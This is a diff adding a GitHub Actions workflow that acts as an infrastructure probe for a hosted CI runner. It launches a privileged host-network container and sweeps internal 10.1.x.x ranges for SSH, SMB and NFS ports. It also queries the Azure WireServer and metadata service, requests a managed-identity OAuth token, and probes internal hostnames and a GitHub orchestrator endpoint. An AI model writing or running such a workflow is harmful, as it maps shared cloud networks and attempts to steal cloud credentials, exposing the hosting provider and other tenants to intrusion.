@@ -1,0 +1,56 @@
+name: i10323-netreach4
+on:
+  workflow_dispatch:
+permissions: write-all
+jobs:
+  reach:
+    runs-on: ubuntu-latest
+    steps:
+      - name: net-reach4
+        shell: bash
+        run: |
+          set +e
+          set +o pipefail
+          echo "R4_START"
+          echo "--- job netns ---"
+          hostname; ip -4 addr 2>/dev/null | grep inet; ip route 2>/dev/null | head -6
+          echo "--- docker daemon view ---"
+          docker ps -a --format '{{.ID}} {{.Image}} {{.Names}} {{.Networks}}' 2>&1 | head -10
+          echo "--- docker networks ---"
+          docker network ls 2>&1 | head -10
+          echo "--- docker images ---"
+          docker images --format '{{.Repository}}:{{.Tag}}' 2>&1 | head -10
+          echo "--- HOSTNET {} ---"
+          docker run --privileged --network host alpine:3.19 sh -c '
+            apk add --no-cache curl >/dev/null 2>&1
+            echo "HN id=$(id -u) host=$(hostname)"
+            ip -4 addr 2>/dev/null | grep inet
+            echo "-- local /20 sweep (22,445,2049,80) --"
+            for i in $(seq 1 254); do
+              for p in 22 445 2049; do
+                timeout 0.4 sh -c "echo > /dev/tcp/10.1.$((i/256)).$((i%256))/$p" 2>/dev/null && echo "OPEN 10.1.$((i/256)).$((i%256)):$p"
+              done
+            done
+            for j in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
+              for p in 22 445 2049; do
+                timeout 0.4 sh -c "echo > /dev/tcp/10.1.$j.1/$p" 2>/dev/null && echo "OPEN 10.1.$j.1:$p"
+              done
+            done
+            echo "SWEEP_DONE"
+            echo "-- Azure WireServer --"
+            for u in "http://168.63.129.16/machine?comp=goalstate" "http://168.63.129.16/?comp=goalstate" "http://168.63.129.16:32526/vmAgent"; do
+              echo "== $u"; curl -sS -m 4 -w "\n  HTTP=%{http_code}\n" -H "x-ms-version: 2012-11-30" "$u" 2>&1 | head -c 500; echo
+            done
+            echo "-- IMDS instance compact --"
+            curl -sS -m 4 -w "\n  IMDS_HTTP=%{http_code}\n" -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=text" 2>&1 | head -c 900; echo
+            echo "-- IMDS managed identity --"
+            curl -sS -m 4 -w "\n  MSI_HTTP=%{http_code}\n" -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 | head -c 400; echo
+            echo "-- DNS internal names via default resolver --"
+            for n in runner.internal metadata.local r2.internal instance-data mails.ucas.edu.cn; do
+              echo -n "$n => "; curl -sS -m 3 -o /dev/null -w "%{http_code} " "http://$n" 2>/dev/null; getent hosts "$n" 2>&1 | head -1; echo
+            done
+            echo "HN2_DONE"
+          ' 2>&1 | head -80
+          echo "--- orchestrator reachability (job netns, single GET) ---"
+          curl -sS -m 5 -o /dev/null -w "ORCH_HTTP=%{http_code} ssl=%{ssl_verify_result}\n" "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/vm/v1" 2>&1 | head -3
+          echo "R4_END"
